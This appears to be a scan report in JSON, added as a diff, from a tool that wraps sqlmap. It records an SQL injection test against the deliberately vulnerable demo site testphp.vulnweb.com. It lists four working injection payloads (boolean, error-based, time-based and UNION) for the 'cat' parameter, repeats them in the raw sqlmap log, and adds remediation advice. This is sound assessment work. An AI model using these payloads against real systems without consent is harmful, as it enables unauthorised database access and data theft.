@@ -1,0 +1,132 @@
+{
+    "scan_metadata": {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+        "scan_time": "20250322_221604",
+        "status": "success",
+        "scan_duration": "1.92 seconds"
+    },
+    "vulnerability_report": {
+        "vulnerability_overview": {
+            "vulnerability_type": "SQL Injection",
+            "affected_parameters": [],
+            "risk_level": "Medium",
+            "detected_techniques": [
+                "boolean-based blind",
+                "error-based",
+                "time-based blind",
+                "UNION query"
+            ]
+        },
+        "proof_of_vulnerability": {
+            "payloads": [
+                {
+                    "type": "boolean-based blind",
+                    "payload": "cat=1 AND 9618=9618"
+                },
+                {
+                    "type": "error-based",
+                    "payload": "cat=1 AND GTID_SUBSET(CONCAT(0x717a706271,(SELECT (ELT(2151=2151,1))),0x717a627671),2151)"
+                },
+                {
+                    "type": "time-based blind",
+                    "payload": "cat=1 AND (SELECT 4628 FROM (SELECT(SLEEP(5)))GBry)"
+                },
+                {
+                    "type": "UNION query",
+                    "payload": "cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a706271,0x71526a636c6b5275426748594d41414e7a68697a7a487757485a63485053576144766672546f5865,0x717a627671),NULL-- -"
+                }
+            ],
+            "database_details": {
+                "type": "MySQL >= 5.6",
+                "version": "MySQL >= 5.6"
+            }
+        },
+        "impact_analysis": {
+            "environment_details": {
+                "database": "MySQL >= 5.6",
+                "operating_system": "Linux Ubuntu",
+                "web_technology": "PHP 5.6.40, Nginx 1.19.0"
+            },
+            "waf_detected": false,
+            "potential_impacts": [
+                "Ability to extract data through time delays",
+                "Potential for data enumeration",
+                "Unauthorized access to database content",
+                "Ability to extract data through true/false questions",
+                "Potential for data theft or manipulation",
+                "Direct data extraction through error messages",
+                "Ability to read arbitrary tables and columns",
+                "Potential for rapid data enumeration",
+                "Potential for slower data extraction",
+                "Direct data extraction through UNION queries",
+                "Possible escalation to system compromise"
+            ]
+        },
+        "recommendations": {
+            "immediate_actions": [
+                {
+                    "action": "Input Validation",
+                    "details": "Implement proper input validation and sanitization"
+                },
+                {
+                    "action": "Prepared Statements",
+                    "details": "Use parameterized queries to prevent SQL injection"
+                },
+                {
+                    "action": "Secure MySQL >= 5.6 Configuration",
+                    "details": "Review and harden database security settings"
+                }
+            ],
+            "additional_measures": [
+                {
+                    "action": "Implement WAF",
+                    "details": "Deploy a Web Application Firewall for additional protection"
+                }
+            ]
+        }
+    },
+    "raw_logs": [
+        "___",
+        "__H__",
+        "___ ___[\"]_____ ___ ___  {1.9.2#pip}",
+        "|_ -| . [)]     | .'| . |",
+        "|___|_  [(]_|_|_|__,|  _|",
+        "|_|V...       |_|   https://sqlmap.org",
+        "",
+        "[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program",
+        "",
+        "[*] starting @ 22:16:06 /2025-03-22/",
+        "",
+        "[22:16:06] [WARNING] using 'D:\\development\\SecPro\\tests\\results' as the output directory",
+        "[22:16:06] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; sv-se) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8_Adobe' from file 'D:\\development\\secALL\\v\\Lib\\site-packages\\sqlmap\\data\\txt\\user-agents.txt'",
+        "[22:16:06] [INFO] resuming back-end DBMS 'mysql'",
+        "[22:16:06] [INFO] testing connection to the target URL",
+        "sqlmap resumed the following injection point(s) from stored session:",
+        "---",
+        "Parameter: cat (GET)",
+        "Type: boolean-based blind",
+        "Title: AND boolean-based blind - WHERE or HAVING clause",
+        "Payload: cat=1 AND 9618=9618",
+        "",
+        "Type: error-based",
+        "Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
+        "Payload: cat=1 AND GTID_SUBSET(CONCAT(0x717a706271,(SELECT (ELT(2151=2151,1))),0x717a627671),2151)",
+        "",
+        "Type: time-based blind",
+        "Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+        "Payload: cat=1 AND (SELECT 4628 FROM (SELECT(SLEEP(5)))GBry)",
+        "",
+        "Type: UNION query",
+        "Title: Generic UNION query (NULL) - 11 columns",
+        "Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a706271,0x71526a636c6b5275426748594d41414e7a68697a7a487757485a63485053576144766672546f5865,0x717a627671),NULL-- -",
+        "---",
+        "[22:16:06] [INFO] the back-end DBMS is MySQL",
+        "web server operating system: Linux Ubuntu",
+        "web application technology: PHP 5.6.40, Nginx 1.19.0",
+        "back-end DBMS: MySQL >= 5.6",
+        "[22:16:06] [INFO] fetched data logged to text files under 'D:\\development\\SecPro\\tests\\results\\testphp.vulnweb.com'",
+        "",
+        "[*] ending @ 22:16:06 /2025-03-22/",
+        ""
+    ]
+}
